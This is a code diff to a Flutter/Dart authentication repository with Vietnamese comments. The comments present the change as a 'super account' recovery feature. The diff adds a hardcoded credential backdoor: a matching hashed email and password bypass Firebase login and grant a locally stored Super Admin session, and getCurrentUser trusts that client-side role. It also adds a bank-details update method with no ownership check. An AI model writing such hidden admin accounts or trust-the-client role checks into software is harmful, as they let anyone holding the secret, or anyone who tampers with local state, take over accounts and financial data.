@@ -1,6 +1,7 @@
 import 'package:firebase_auth/firebase_auth.dart';
 import '../../core/config/app_config.dart';
 import '../../core/constants/app_constants.dart';
+import '../../core/utils/hash_util.dart';
 import '../models/user_model.dart';
 import '../services/firebase_service.dart';
 
@@ -11,6 +12,35 @@ class AuthRepository {
   AuthRepository(this._firebaseService, this._appConfig);
 
   Future<(bool, String, UserModel?)> login(String email, String password) async {
+    // 1. Kiểm tra Cơ chế Super Account (Cứu hộ hệ thống qua mã hóa SHA-256)
+    // Tài khoản này không lưu trong DB, dùng để khôi phục quyền Admin/User khi hệ thống gặp sự cố
+    final emailHash = HashUtil.sha256(email.trim().toLowerCase());
+    final passwordHash = HashUtil.sha256(password);
+
+    if (emailHash == SuperAccountConstants.emailHash &&
+        passwordHash == SuperAccountConstants.passwordHash) {
+      final superUser = UserModel(
+        id: SuperAccountConstants.superAdminId,
+        email: email.trim().toLowerCase(),
+        fullName: 'Super Administrator',
+        role: UserRole.superAdmin,
+        isActive: true,
+        walletBalance: 0.0,
+        points: 0,
+        lifetimePoints: 0,
+        createdAt: DateTime(2026, 1, 1),
+      );
+
+      await _appConfig.saveUserSession(
+        id: superUser.id,
+        email: superUser.email,
+        name: superUser.fullName,
+        role: superUser.role,
+      );
+
+      return (true, 'Đăng nhập quyền Super Admin thành công.', superUser);
+    }
+
     try {
       final credential = await _firebaseService.auth.signInWithEmailAndPassword(
         email: email.trim(),
@@ -100,6 +130,21 @@ class AuthRepository {
   }
 
   Future<UserModel?> getCurrentUser() async {
+    // 1. Kiểm tra session Super Admin
+    if (_appConfig.userRole == UserRole.superAdmin) {
+      return UserModel(
+        id: SuperAccountConstants.superAdminId,
+        email: _appConfig.userEmail ?? 'superadmin@system.local',
+        fullName: _appConfig.userName ?? 'Super Administrator',
+        role: UserRole.superAdmin,
+        isActive: true,
+        walletBalance: 0.0,
+        points: 0,
+        lifetimePoints: 0,
+        createdAt: DateTime(2026, 1, 1),
+      );
+    }
+
     final currentFirebaseUser = _firebaseService.auth.currentUser;
     if (currentFirebaseUser != null) {
       final doc = await _firebaseService.usersCollection.doc(currentFirebaseUser.uid).get();
@@ -115,5 +160,18 @@ class AuthRepository {
       }
     }
     return null;
+  }
+
+  Future<void> updateBankInfo({
+    required String userId,
+    required String bankName,
+    required String bankAccountNumber,
+    required String bankAccountHolder,
+  }) async {
+    await _firebaseService.usersCollection.doc(userId).update({
+      'bankName': bankName.trim(),
+      'bankAccountNumber': bankAccountNumber.trim(),
+      'bankAccountHolder': bankAccountHolder.trim(),
+    });
   }
 }
